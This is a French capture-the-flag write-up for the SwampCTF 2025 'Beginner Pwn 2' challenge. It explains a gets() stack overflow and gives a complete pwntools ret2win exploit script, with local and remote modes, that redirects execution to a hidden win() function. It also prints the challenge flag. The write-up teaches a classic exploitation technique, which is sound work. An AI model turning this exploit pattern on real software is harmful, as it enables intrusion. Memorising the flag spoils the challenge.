# Write-up : Challenge Beginner Pwn 2 - SwampCTF 2025

## Objectif du challenge

Le challenge propose un binaire contenant une fonction qui n'est pas appelée dans le flux d'exécution normal. L'objectif est de détourner le flux d'exécution pour appeler cette fonction et obtenir le flag.

## Analyse initiale

### Vérification des protections

Les résultats de checksec montrent les caractéristiques suivantes :
- RELRO : Partiel
- Stack Canary : Non activé
- NX : Activé
- PIE : Non activé

L'absence de canari de pile et de PIE facilite l'exploitation, car nous pourrons écraser l'adresse de retour sans déclencher de protection et nous connaîtrons l'adresse exacte des fonctions.

### Comportement du programme

À l'exécution, le binaire lit une ligne d'entrée utilisateur et la renvoie avec un message de salutation. Ce comportement simple masque la vulnérabilité sous-jacente.

## Analyse du binaire

### Fonction main

```c
undefined8 main(void)
{
  undefined8 local_12;
  undefined2 local_a;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  local_12 = 0;
  local_a = 0;
  gets((char *)&local_12);
  printf("Hello, %s!\n", &local_12);
  return 0;
}
```

L'analyse révèle l'utilisation de la fonction `gets()`, connue pour être vulnérable aux débordements de tampon. Cette fonction ne vérifie pas les limites du tampon de destination, permettant d'écrire au-delà de l'espace alloué.

### Fonction win

```c
void win(void)
{
  puts("win");
  FILE *f = fopen("flag.txt", "r");
  fread(&local_38, 1, 0x1e, f);
  printf("Here is your flag! %s\n", &local_38);
  fclose(f);
}
```

Cette fonction n'est jamais appelée dans le programme mais elle ouvre le fichier contenant le flag et l'affiche. C'est notre cible pour l'exploitation.

## Vulnérabilité identifiée

L'utilisation de `gets()` sans aucune vérification des limites constitue une vulnérabilité de débordement de tampon classique. Cette vulnérabilité permettra d'écraser l'adresse de retour stockée sur la pile pour rediriger l'exécution vers la fonction `win()`.

## Détermination de l'offset

Pour trouver l'offset exact permettant d'atteindre l'adresse de retour, un motif cyclique a été utilisé avec GDB-peda :

1. Création d'un motif unique : `pattern_create`
2. Introduction du motif comme entrée au programme
3. Observation de l'adresse qui provoque le SIGSEGV
4. Calcul de l'offset avec `pattern_offset`

L'analyse révèle que l'offset nécessaire est de 18 octets (0x12) pour atteindre l'adresse de retour.

## Conception de l'exploitation

La chaîne d'exploitation est simple, car il suffit de :
1. Écrire 18 octets de remplissage
2. Écraser l'adresse de retour avec l'adresse de la fonction `win()`

Structure du payload :
```
[remplissage de 18 octets] + [adresse de win()]
```

## Script d'exploitation

```python
#!/usr/bin/env python3

from pwn import *
import argparse
import sys

BUFFER_OFFSET = 0x12

def build_payload(win_addr):
    payload  = b"A" * BUFFER_OFFSET
    payload += p64(win_addr)
    return payload

def run_local(path):
    print(f"[*] Exécution locale: {path}")
    elf = ELF(path)
    context.binary = elf
    return elf, process(path)

def run_remote(host, port, path):
    print(f"[*] Connexion à {host}:{port}")
    elf = ELF(path)
    context.binary = elf
    return elf, remote(host, port)

def main():
    parser = argparse.ArgumentParser(description="Exploitation pour Beginner Pwn 2")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # Mode local
    local_parser = subparsers.add_parser("local")
    local_parser.add_argument("binary", type=str, help="Chemin vers le binaire local")

    # Mode distant
    remote_parser = subparsers.add_parser("remote")
    remote_parser.add_argument("ip", type=str, help="IP distante")
    remote_parser.add_argument("port", type=int, help="Port distant")
    remote_parser.add_argument("binary", type=str, help="Chemin vers le binaire pour la résolution des symboles")

    args = parser.parse_args()

    # Configuration
    if args.mode == "local":
        elf, io = run_local(args.binary)
    else:
        elf, io = run_remote(args.ip, args.port, args.binary)

    # Construction et envoi du payload
    win_addr = elf.symbols["win"]
    payload = build_payload(win_addr)

    io.sendline(payload)

    # Extraction du flag
    try:
        io.readuntil(b"swampCTF{")
        flag = "swampCTF{" + io.readuntil(b"}").decode()
        print(f"[+] Flag: {flag}")
    except:
        print("[-] Échec de la capture du flag.")
        io.interactive()

    io.close()

if __name__ == "__main__":
    main()
```

## Exécution et résultat

L'exécution du script d'exploitation aboutit à l'affichage du flag :
```
[+] Flag: swampCTF{1t5_t1m3_t0_r3turn!!}
```

## Conclusion

Ce challenge illustre un cas classique de vulnérabilité par débordement de tampon, facilitée par :

1. L'utilisation de la fonction dangereuse `gets()`
2. L'absence de canari de pile pour détecter les débordements
3. L'absence de PIE, rendant l'adresse de la fonction `win()` prévisible

L'exploitation consiste simplement à écraser l'adresse de retour pour rediriger le flux d'exécution vers une fonction existante mais normalement inaccessible, technique connue sous le nom de ret2win.
